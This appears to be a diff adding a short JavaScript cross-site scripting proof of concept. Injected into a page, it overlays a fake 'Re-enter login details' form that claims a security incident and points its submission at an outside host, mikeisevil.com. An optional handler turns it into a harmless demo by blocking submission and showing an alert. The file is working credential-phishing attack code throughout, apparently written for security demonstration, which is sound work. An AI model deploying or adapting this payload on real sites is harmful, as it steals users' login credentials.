@@ -1,0 +1,9 @@
+// A basic XSS example to be included into a page for proof of concept (PoC)
+// Shows an overlaid login form
+document.body.innerHTML += '<div id="dodgy-overlay" style="position: absolute;top: 0;bottom: 0;left: 0;right: 0;z-index: 1000;background-color: rgba(0,0,0,0.7);"><form id="evil-form" style="max-width:500px;margin: 3em auto; background: white; border: 1px solid #ccc;padding:2em;font-family: arial, sans-serif;color:#333;border-radius: 5px;" action="https://mikeisevil.com/form"><h2 style="margin-bottom:1em;text-align:center;">Re-enter login details</h2><p style="margin-bottom:1em;">You have been logged out due to a security incident. Please log in again to access this page.</p><div style="border:1px solid #ccc; padding: 1em;"><p style="margin-bottom:1em;"> <label for="username" style="display:inline-block;width: 7em;">Username:</label><input type="text" name="username" id="username" placeholder="Username" style="padding: 0.4em;"></p><p style="margin-bottom:1em;"> <label for="password" style="display:inline-block;width: 7em;">Password:</label><input type="password" name="password" id="password" placeholder="Password" style="padding: 0.4em;"></p><p style="margin-bottom: 1em;padding-left:7em;"><button type="submit" style="padding:0.8em 1em; background-color: #3a3; color:white; border: none; font-weight: bold; font-size:1.1em;border-radius: 5px; line-height: 1;">&#x1f512; Login</button></p></div></form></div>';
+
+// Optional CSS + JS to stop scrolling when overlay is visible and handle the form submit event (show message + close form)
+document.body.style.height="100%";
+document.body.style.overflow="hidden";
+window.scrollTo(0,0);
+document.getElementById("evil-form").addEventListener("submit", function(ev){ev.preventDefault(); alert("Your login information has just been stolen!");ev.target.parentElement.remove();document.body.style.height="auto";document.body.style.overflow="auto";});
